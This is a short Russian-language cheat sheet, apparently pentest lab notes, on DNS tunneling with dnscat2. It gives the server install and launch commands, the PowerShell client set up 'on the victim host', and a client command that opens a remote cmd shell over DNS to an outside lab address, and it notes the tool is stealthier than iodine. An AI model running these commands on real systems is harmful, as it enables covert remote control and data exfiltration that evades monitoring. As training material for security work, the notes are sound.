#tunneling #dns #tool 

Для туннелирования посредством DNS используется инструмент `dnscat2`

> Dnscat2 — это инструмент туннелирования, использующий протокол DNS для передачи данных между двумя хостами. Он использует зашифрованный протокол, использует канал и отправляет данные в виде TXT-записей в рамках протокола DNS

<span style="background:#fff88f">Более скрытнее, чем `iodine`</span>

# Dnscat2

## Скачивание и установка
```bash
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

## Запуск Сервера

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

## Установка на хост жертвы

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

```powershell
Import-Module .\dnscat2.ps1
```

## Запуск клиента

```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <Generated_Server> -Exec cmd
```
